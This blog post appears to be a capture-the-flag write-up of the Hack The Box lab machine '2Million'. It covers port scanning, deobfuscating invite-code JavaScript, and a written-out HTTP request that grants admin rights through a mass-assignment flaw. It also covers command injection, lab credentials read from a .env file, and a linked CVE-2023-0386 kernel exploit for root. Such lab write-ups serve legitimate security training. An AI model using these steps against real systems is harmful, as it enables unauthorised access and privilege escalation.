---
layout: post
title: "TwoMillion"
date: 2024-07-21 16:42:01 +0200
categories: ctf
---

# CTF Report: 2Million

## Initial Results and Information

We started by performing an Nmap scan on the target machine:

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -p- 10.10.11.221      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-21 15:39 CEST
Nmap scan report for 10.10.11.221
Host is up (0.031s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap done: 1 IP address (1 host up) scanned in 21.97 seconds
We have two services running: SSH and a web server.
```

We have two services running: SSH and a web server.

## Enumeration Phase

### Web Server Homepage
![2b4368219349640e5d571108903dcc2b.png](/assets/twomillions/2b4368219349640e5d571108903dcc2b.png)
### Directory Enumeration
![3958c0d1ebd140c3335b676eb97c8393.png](/assets/twomillions/3958c0d1ebd140c3335b676eb97c8393.png)


### Login Page
![ee2c34cb370c3603acc41c5d1c1614dd.png](/assets/twomillions/ee2c34cb370c3603acc41c5d1c1614dd.png)
### Invite Code Page
![c33c429a91101748474f524e57cec623.png](/assets/twomillions/c33c429a91101748474f524e57cec623.png)

### JavaScript for Invite Code
![7a02abecdc14e8489a33aa906aabab76.png](/assets/twomillions/7a02abecdc14e8489a33aa906aabab76.png)


```javascript
eval(
  function (p, a, c, k, e, d) {
    e = function (c) {
      return c.toString(36)
    };
    if (!''.replace(/^/, String)) {
      while (c--) {
        d[c.toString(a)] = k[c] ||
        c.toString(a)
      }
      k = [
        function (e) {
          return d[e]
        }
      ];
      e = function () {
        return '\\w+'
      };
      c = 1
    };
    while (c--) {
      if (k[c]) {
        p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c])
      }
    }
    return p
  }(
    '1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',
    24,
    24,
    'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),
    0,
    {
    }
  )
)
```

## Exploitation Phase
The JavaScript was deobfuscated as follows:
```javscript
function verifyInviteCode(code){
    var formData = {"code": code};
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function(response){
            console.log(response);
        },
        error: function(response){
            console.log(response);
        }
    });
}

function makeInviteCode(){
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/generate',
        success: function(response){
            console.log(response);
        },
        error: function(response){
            console.log(response);
        }
    });
}
```

### Generating the Invite Code

We performed a POST request to obtain the invite code:

![2220ad7232fbb5fb369c6480ad549c8e.png](/assets/twomillions/2220ad7232fbb5fb369c6480ad549c8e.png)

Here it is in base64:
`NUxMWjktMVdGS0ktWDMyMjctSUxBTkQ=`

Using this code, we were able to register on the site:
![eb0e3f8c3ffd7145cb7ea54995265b26.png](/assets/twomillions/eb0e3f8c3ffd7145cb7ea54995265b26.png)

### Accessing the Site
With the credentials:

User: test
Email: test@test.it
Password: test

![566e75becfbbf09896dd2a6571f2481f.png](/assets/twomillions/566e75becfbbf09896dd2a6571f2481f.png)


We successfully logged in:
![f3f2b6ed4e46a2ddb792371833b3d166.png](/assets/twomillions/f3f2b6ed4e46a2ddb792371833b3d166.png)

### API Exploration
We found an API list within the web pages:
![58af2c98bc55d9c263de73eb2eca5e88.png](/assets/twomillions/58af2c98bc55d9c263de73eb2eca5e88.png)

### Modifying Admin Settings

We attempted to modify the admin settings with the following payload:

![ecbb62b57f9fd83cdd85860ae89a1622.png](/assets/twomillions/ecbb62b57f9fd83cdd85860ae89a1622.png)

```http
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: PHPSESSID=0at92ian3f6vu79iq3p3vjt6gc
Upgrade-Insecure-Requests: 1
Content-Length: 55
Content-Type: application/json

{"email":"test@test.it","username":"test","is_admin":1}
```

```
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 21 Jul 2024 14:55:58 GMT
Content-Type: application/json
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 40

{"id":13,"username":"test","is_admin":1}
```

---

### Confirmation of the change:
![c59a0cfabdc7ef42f9879e2149284c46.png](/assets/twomillions/c59a0cfabdc7ef42f9879e2149284c46.png)

### Verifying Admin Authentication
We performed a request to verify admin privileges:

```
GET /api/v1/admin/auth HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: PHPSESSID=0at92ian3f6vu79iq3p3vjt6gc
Upgrade-Insecure-Requests: 1
Content-Length: 0

```

```
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 21 Jul 2024 14:58:00 GMT
Content-Type: application/json
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 16

{"message":true}
```

Trying to open a vpn as an admin:
![15d60a48d6aa8df807de991f8db7b242.png](/assets/twomillions/15d60a48d6aa8df807de991f8db7b242.png)

### Command Injection Testing
We identified a command injection vulnerability:
![38eaf9aa1baf84e710048e6ac6eb0d0e.png](/assets/twomillions/38eaf9aa1baf84e710048e6ac6eb0d0e.png)

We attempted to use a reverse shell:

![e94d585d756507622c5b122442e6d074.png](/assets/twomillions/e94d585d756507622c5b122442e6d074.png)

## Post-Exploitation Phase

### Enumeration as www-data
After gaining access, we started enumerating as www-data:

```bash
www-data@2million:~/html$ ls -la
ls -la
total 56
drwxr-xr-x 10 root root 4096 Jul 21 15:30 .
drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
-rw-r--r--  1 root root   87 Jun  2  2023 .env
-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
drwxr-xr-x  5 root root 4096 Jul 21 15:30 VPN
drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
drwxr-xr-x  5 root root 4096 Jun  6  2023 css
drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
drwxr-xr-x  2 root root 4096 Jun  6  2023 images
-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
drwxr-xr-x  3 root root 4096 Jun  6  2023 js
drwxr-xr-x  2 root root 4096 Jun  6  2023 views
www-data@2million:~/html$ cat .env
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

etc/passwd File
![c6702f5076ef892a0c613e4b3900722d.png](/assets/twomillions/c6702f5076ef892a0c613e4b3900722d.png)

### Logging in as Admin
We tried logging in as the admin user:
![c5d817989ff3e0cfa3165f2c793457b5.png](/assets/twomillions/c5d817989ff3e0cfa3165f2c793457b5.png)

We obtained the following email:

```bash
admin@2million:/var/spool/mail$ cat admin                                                                           
From: ch4p <ch4p@2million.htb>                                                                                      
To: admin <admin@2million.htb>                                                                                      
Cc: g0blin <g0blin@2million.htb>                                                                                    
Subject: Urgent: Patch System OS                                                                                    
Date: Tue, 1 June 2023 10:45:22 -0700                                                                               
Message-ID: <9876543210@2million.htb>                                                                               
X-Mailer: ThunderMail Pro 5.2                                                                                       
                                                                                                                    
Hey admin,                                                                                                          
                                                                                                                    
I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

Exploiting OverlayFS / FUSE
We searched for an exploit related to OverlayFS / FUSE and used the following exploit to escalate privileges:

https://github.com/xkaneiki/CVE-2023-0386

![83971102f5a10f7c29852a2585a0406a.png](/assets/twomillions/83971102f5a10f7c29852a2585a0406a.png)

![c6e6593f15bcbc4154022844f077bd23.png](/assets/twomillions/c6e6593f15bcbc4154022844f077bd23.png)
